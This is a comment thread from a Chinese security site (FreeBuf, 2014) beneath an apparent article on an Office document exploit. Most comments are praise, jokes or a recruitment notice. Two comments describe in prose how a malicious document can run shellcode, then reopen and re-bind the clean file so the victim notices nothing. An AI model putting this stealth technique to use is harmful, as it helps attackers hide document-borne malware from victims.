<li><a data-id="37427" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-fakemac even depth-2" id="li-comment-37433">
    <div id="comment-37433">
        <div class="photo"> <a href="http://www.freebuf.com/author/fakemac">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/fakemac" target="_blank">fakemac&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37433','37433', 'respond','26441' ) " href="?replytocom=37433#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@klaava   应该是，看着貌似是跟看雪同步发布，难道混金币。</p>
<div class="comment-tools">
<div class="vote" id="vote-37433"><span id="acv_stat_37433"></span><a class="ilike_icon"  id="vote4-37433" href="javascript:acv_vote(37433,1);">亮了</a>(<span id="cos_support-37433">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37433" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37433" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37433" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37433" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37433" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt depth-2" id="li-comment-37435">
    <div id="comment-37435">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic5.png">     </div>
    <div class="tit"> 
	    <span class="name"> 夜未央 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37435','37435', 'respond','26441' ) " href="?replytocom=37435#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@klaava   freebuf通过之后，才发到看雪上的</p>
<div class="comment-tools">
<div class="vote" id="vote-37435"><span id="acv_stat_37435"></span><a class="ilike_icon"  id="vote4-37435" href="javascript:acv_vote(37435,1);">亮了</a>(<span id="cos_support-37435">6</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37435" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37435" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37435" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37435" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37435" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment even thread-even depth-1" id="li-comment-37428">
    <div id="comment-37428">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic16.png">     </div>
    <div class="tit"> 
	    <span class="name"> sat </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37428','37428', 'respond','26441' ) " href="?replytocom=37428#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">9楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>找个玩渗透网站的、教我玩渗透、我给他八位qq和情侣qq。(qq都是10年和11年前的。）</p>
<div class="comment-tools">
<div class="vote" id="vote-37428"><span id="acv_stat_37428"></span><a class="ilike_icon"  id="vote4-37428" href="javascript:acv_vote(37428,1);">亮了</a>(<span id="cos_support-37428">17</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37428" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37428" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37428" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37428" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37428" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-37429">
    <div id="comment-37429">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic7.png">     </div>
    <div class="tit"> 
	    <span class="name"> yyyy333333 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37429','37429', 'respond','26441' ) " href="?replytocom=37429#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">10楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>这才是硬货 这才应该出现在freebuf上 </p>
<p>我是XXX 我有32个赞</p>
<div class="comment-tools">
<div class="vote" id="vote-37429"><span id="acv_stat_37429"></span><a class="ilike_icon"  id="vote4-37429" href="javascript:acv_vote(37429,1);">亮了</a>(<span id="cos_support-37429">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37429" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37429" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37429" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37429" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37429" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-even depth-1" id="li-comment-37439">
    <div id="comment-37439">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic17.png">     </div>
    <div class="tit"> 
	    <span class="name"> c4rp3nt3r </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37439','37439', 'respond','26441' ) " href="?replytocom=37439#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">11楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p> <img src='http://image.3001.net/images/index/smilies/icon_biggrin.gif' alt=':grin:' class='wp-smiley' />   <img src='http://image.3001.net/images/index/smilies/icon_biggrin.gif' alt=':grin:' class='wp-smiley' />   <img src='http://image.3001.net/images/index/smilies/icon_biggrin.gif' alt=':grin:' class='wp-smiley' /><br />
好文章，感谢作者，感谢freebuf</p>
<div class="comment-tools">
<div class="vote" id="vote-37439"><span id="acv_stat_37439"></span><a class="ilike_icon"  id="vote4-37439" href="javascript:acv_vote(37439,1);">亮了</a>(<span id="cos_support-37439">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37439" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37439" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37439" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37439" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37439" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-thanks odd alt thread-odd thread-alt depth-1" id="li-comment-37440">
    <div id="comment-37440">
        <div class="photo"> <a href="http://www.freebuf.com/author/thanks">
    <img src="http://image.3001.net/images/20170302/14884378704278.jpg!video"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/thanks" target="_blank">thanks&nbsp;</a>  </span>
        		
		<span class="icon-f"> <a href="http://www.freebuf.com/bufer" target="_blank"><img src="http://image.3001.net/images/index/f1.png" title="认证作者"></a><a href="http://zhuanlan.freebuf.com" target="_blank"><img src="http://image.3001.net/images/index/column-iden.png" title="专栏作者"></a></span>
		<span class="rank">(8级)</span>
				<span class="explain"> FreeBuf常务处主任 </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37440','37440', 'respond','26441' ) " href="?replytocom=37440#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">12楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>神配图。。</p>
<div class="comment-tools">
<div class="vote" id="vote-37440"><span id="acv_stat_37440"></span><a class="ilike_icon"  id="vote4-37440" href="javascript:acv_vote(37440,1);">亮了</a>(<span id="cos_support-37440">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37440" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37440" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37440" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37440" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37440" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-anlfi even thread-even depth-1" id="li-comment-37441">
    <div id="comment-37441">
        <div class="photo"> <a href="http://www.freebuf.com/author/anlfi">
    <img src="http://image.3001.net/2013/09/20130928021210.jpg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/anlfi" target="_blank">anlfi&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(5级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37441','37441', 'respond','26441' ) " href="?replytocom=37441#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">13楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>不明觉利 不就是解决 打开不异常可正常编辑且运行shellcode吗<br />
               什么堆栈修复修复内存balala&#8230;.什么不弹不卡的完美exp好像好厉害的样子</p>
<p>国外人家只用了最简单的方法就解决了<br />
只要触发(点击doc文档)&gt;&gt;&gt;到正常流程溢出&gt;&gt;&gt;执行shellcode 关闭程序转移进程&gt;&gt;&gt;<br />
shellcode把恶意doc中附加的正常文件的hex码从尾部取出到缓存<br />
&gt;&gt;&gt;&gt;然后再次打开&gt;&gt;&gt;交给用户<br />
等用户编辑完以后 shellcode再次捆绑文件附加到文件尾部 依次反复执行</p>
<div class="comment-tools">
<div class="vote" id="vote-37441"><span id="acv_stat_37441"></span><a class="ilike_icon"  id="vote4-37441" href="javascript:acv_vote(37441,1);">亮了</a>(<span id="cos_support-37441">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37441" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37441" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37441" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37441" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37441" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment odd alt depth-2" id="li-comment-37446">
    <div id="comment-37446">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic4.png">     </div>
    <div class="tit"> 
	    <span class="name"> 夜未央 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37446','37446', 'respond','26441' ) " href="?replytocom=37446#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@anlfi   能否提供相应的例子或者其他信息，感激不尽，发这篇文章的目的也是抛砖引玉</p>
<div class="comment-tools">
<div class="vote" id="vote-37446"><span id="acv_stat_37446"></span><a class="ilike_icon"  id="vote4-37446" href="javascript:acv_vote(37446,1);">亮了</a>(<span id="cos_support-37446">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37446" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37446" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37446" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37446" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37446" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment byuser comment-author-anlfi even thread-odd thread-alt depth-1" id="li-comment-37445">
    <div id="comment-37445">
        <div class="photo"> <a href="http://www.freebuf.com/author/anlfi">
    <img src="http://image.3001.net/2013/09/20130928021210.jpg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/anlfi" target="_blank">anlfi&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(5级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37445','37445', 'respond','26441' ) " href="?replytocom=37445#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">14楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>上面的编辑不了 小编帮忙删掉一些</p>
<p>触发(点击doc文档)&gt;&gt;&gt;到正常流程溢出&gt;&gt;&gt;执行shellcode 关闭程序转移进程&gt;&gt;&gt;<br />
shellcode把恶意doc中附加的正常文件的hex码从尾部取出到缓存<br />
&gt;&gt;&gt;&gt;然后再次打开&gt;&gt;&gt;交给用户<br />
等用户编辑完以后 shellcode再次捆绑文件附加到文件尾部 依次反复执行 </p>
<p>这是正常流程 能不弹不卡能正常流程退出还算ok<br />
 但用户能够自由编辑 保存 且不出现乱码的确不容易<br />
这才是利用的艺术</p>
<div class="comment-tools">
<div class="vote" id="vote-37445"><span id="acv_stat_37445"></span><a class="ilike_icon"  id="vote4-37445" href="javascript:acv_vote(37445,1);">亮了</a>(<span id="cos_support-37445">5</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37445" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37445" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37445" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37445" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37445" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-wn7ll odd alt depth-2" id="li-comment-38064">
    <div id="comment-38064">
        <div class="photo"> <a href="http://www.freebuf.com/author/w@n7@ll">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/w@n7@ll" target="_blank">w@n7@ll&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-03-04</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-38064','38064', 'respond','26441' ) " href="?replytocom=38064#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@anlfi 怎么防</p>
<div class="comment-tools">
<div class="vote" id="vote-38064"><span id="acv_stat_38064"></span><a class="ilike_icon"  id="vote4-38064" href="javascript:acv_vote(38064,1);">亮了</a>(<span id="cos_support-38064">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="38064" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="38064" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="38064" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="38064" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="38064" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment even depth-3" id="li-comment-38081">
    <div id="comment-38081">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic1.png">     </div>
    <div class="tit"> 
	    <span class="name"> aaaaa </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-03-04</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		           <a onclick="return addComment.moveForm( 'comment-38081','38064', 'respond','26441' )" href="?replytocom=38081#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@w@n7@ll   他就是吹个牛逼，你别当真</p>
<div class="comment-tools">
<div class="vote" id="vote-38081"><span id="acv_stat_38081"></span><a class="ilike_icon"  id="vote4-38081" href="javascript:acv_vote(38081,1);">亮了</a>(<span id="cos_support-38081">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="38081" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="38081" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="38081" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="38081" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="38081" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment byuser comment-author-angellover08 odd alt thread-even depth-1" id="li-comment-37447">
    <div id="comment-37447">
        <div class="photo"> <a href="http://www.freebuf.com/author/angellover08">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/angellover08" target="_blank">angellover08&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(4级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37447','37447', 'respond','26441' ) " href="?replytocom=37447#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">15楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>nice post</p>
<div class="comment-tools">
<div class="vote" id="vote-37447"><span id="acv_stat_37447"></span><a class="ilike_icon"  id="vote4-37447" href="javascript:acv_vote(37447,1);">亮了</a>(<span id="cos_support-37447">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37447" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37447" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37447" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37447" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37447" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-37456">
    <div id="comment-37456">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic17.png">     </div>
    <div class="tit"> 
	    <span class="name"> 姑娘头发太长没心思看完 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37456','37456', 'respond','26441' ) " href="?replytocom=37456#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">16楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p> <img src='http://image.3001.net/images/index/smilies/icon_surprised.gif' alt=':eek:' class='wp-smiley' /> </p>
<div class="comment-tools">
<div class="vote" id="vote-37456"><span id="acv_stat_37456"></span><a class="ilike_icon"  id="vote4-37456" href="javascript:acv_vote(37456,1);">亮了</a>(<span id="cos_support-37456">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37456" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37456" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37456" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37456" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37456" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-even depth-1" id="li-comment-70737">
    <div id="comment-70737">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic18.png">     </div>
    <div class="tit"> 
	    <span class="name"> yuange1975<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-70737','70737', 'respond','26441' ) " href="?replytocom=70737#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">17楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>现在准备组队，做漏洞研究、挖掘等工作，有兴趣的可以发份简历到yuanrenguang(at)360.cn。可以直接接触更多漏洞方面的思想，还可以学习蓝翔的机械化挖掘，和国际牛人吴石  誓比高低。 //: shit！这不是我实现的吗？虽然漏洞不同，但思路跟我的一模一样，我是不是该说点什么？</p>
<div class="comment-tools">
<div class="vote" id="vote-70737"><span id="acv_stat_70737"></span><a class="ilike_icon"  id="vote4-70737" href="javascript:acv_vote(70737,1);">亮了</a>(<span id="cos_support-70737">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="70737" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="70737" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="70737" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="70737" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="70737" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-70735">
    <div id="comment-70735">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic15.png">     </div>
    <div class="tit"> 
	    <span class="name"> instruder<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-70735','70735', 'respond','26441' ) " href="?replytocom=70735#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">18楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p><img data-original="http://timg.sjs.sinajs.cn/t3/style/images/common/face/ext/normal/c2/tooth.gif" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" title="嘻嘻" /></p>
<noscript><img src="http://timg.sjs.sinajs.cn/t3/style/images/common/face/ext/normal/c2/tooth.gif" title="嘻嘻" /></noscript>
<div class="comment-tools">
<div class="vote" id="vote-70735"><span id="acv_stat_70735"></span><a class="ilike_icon"  id="vote4-70735" href="javascript:acv_vote(70735,1);">亮了</a>(<span id="cos_support-70735">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="70735" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="70735" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="70735" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="70735" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="70735" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-even depth-1" id="li-comment-70736">
    <div id="comment-70736">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic10.png">     </div>
    <div class="tit"> 
	    <span class="name"> 镜爷骑着小白马<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-70736','70736', 'respond','26441' ) " href="?replytocom=70736#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">19楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p><img data-original="http://img.t.sinajs.cn/t3/style/images/common/face/ext/normal/7e/love.gif" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" title="爱你" /></p>
<noscript><img src="http://img.t.sinajs.cn/t3/style/images/common/face/ext/normal/7e/love.gif" title="爱你" /></noscript>
<p>好好开会</p>
<div class="comment-tools">
<div class="vote" id="vote-70736"><span id="acv_stat_70736"></span><a class="ilike_icon"  id="vote4-70736" href="javascript:acv_vote(70736,1);">亮了</a>(<span id="cos_support-70736">0</span>)</div>
